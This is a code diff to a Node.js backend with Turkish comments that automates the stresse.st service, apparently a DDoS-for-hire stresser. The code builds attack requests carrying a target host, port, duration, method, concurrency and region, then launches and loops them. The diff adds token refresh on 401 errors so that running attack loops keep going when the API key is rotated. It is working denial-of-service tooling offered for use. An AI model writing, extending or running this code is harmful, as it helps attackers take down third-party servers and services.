@@ -142,6 +142,30 @@ function getFallbackApiToken() {
   return '';
 }
 
+// stresse.st'te API key yenilenirse (Generate Token) eski key 401 dondurur.
+// Web oturumu (cookie) uzerinden guncel key'i cekip session'a ve fallback
+// dosyasina yazar; boylece loop'lar key yenilenmesinde olmez.
+async function refreshApiToken(sessionId) {
+  try {
+    const client = getClient(sessionId);
+    const tokenRes = await client.get('/getApiToken');
+    const apiToken = tokenRes.data?.apitoken || tokenRes.data?.token || tokenRes.data?.apiToken || null;
+    if (!apiToken) return null;
+    sessions[sessionId].apiToken = apiToken;
+    try {
+      fs.writeFileSync(API_TOKEN_FILE, apiToken);
+    } catch (writeErr) {
+      console.warn('[apiToken] Fallback dosyasi yazilamadi:', writeErr.message);
+    }
+    saveState();
+    console.log(`[apiToken] Guncel API token yenilendi: ${apiToken.slice(0, 8)}...`);
+    return apiToken;
+  } catch (err) {
+    console.warn(`[apiToken] Token yenileme basarisiz: ${err.message}`);
+    return null;
+  }
+}
+
 let saveStateRunning = false;
 let saveStatePending = false;
 
@@ -369,7 +393,7 @@ function buildApiUrl(apiToken, params) {
   const geo = params.geo || 'worldwide';
   const method = String(params.method || '');
   const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
-  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} geo=${geo} conc=${params.concurrents || 1}`);
+  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} time=${params.time} geo=${geo} conc=${params.concurrents || 1}`);
   return url;
 }
 
@@ -416,9 +440,23 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
       concurrents
     });
   } catch (err) {
-    // Timeout'ta istek bizden dustu ama stresse.st saldirilari baslatmis olabilir.
-    // /ongoing uzerinden yeni ID'leri kurtarmayi dene; yoksa gercek hata say.
-    if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
+    // API key stresse.st'te yenilenmisse (Generate Token) eski key 401 verir.
+    // Web oturumu uzerinden guncel key'i cekip launch'i bir kez tekrarla.
+    if (err.response?.status === 401) {
+      console.warn(`[launchAttacksGet] 401 (Invalid API key); guncel token cekilip tekrar denenecek...`);
+      const freshToken = await refreshApiToken(sessionId);
+      if (!freshToken) {
+        console.error(`[launchAttacksGet] GET /api hata:`, err.message);
+        throw err;
+      }
+      data = await startAttackApi(getApiClient(sessionId), {
+        apiToken: freshToken,
+        ...params,
+        concurrents
+      });
+    } else if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
+      // Timeout'ta istek bizden dustu ama stresse.st saldirilari baslatmis olabilir.
+      // /ongoing uzerinden yeni ID'leri kurtarmayi dene; yoksa gercek hata say.
       console.warn(`[launchAttacksGet] GET /api timeout; /ongoing'den kurtarma deneniyor...`);
       await new Promise((r) => setTimeout(r, 4000));
       const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
@@ -431,9 +469,12 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
           elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
         };
       }
+      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
+      throw err;
+    } else {
+      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
+      throw err;
     }
-    console.error(`[launchAttacksGet] GET /api hata:`, err.message);
-    throw err;
   }
 
   // API response'undaki attack_id'leri al.
@@ -953,6 +994,15 @@ app.post('/api/stresse/login', async (req, res) => {
       sessions[sessionId].user = vcookieRes.data;
       sessions[sessionId].plan = planData;
       sessions[sessionId].apiToken = apiToken;
+      // Basarili loginde guncel key'i fallback dosyasina da yaz; ileride
+      // token'suz login'lerde ve yenileme senaryolarinda guncel kalsin.
+      if (apiToken) {
+        try {
+          fs.writeFileSync(API_TOKEN_FILE, apiToken);
+        } catch (writeErr) {
+          console.warn('[login] Fallback token dosyasi yazilamadi:', writeErr.message);
+        }
+      }
       saveState();
 
       res.json({
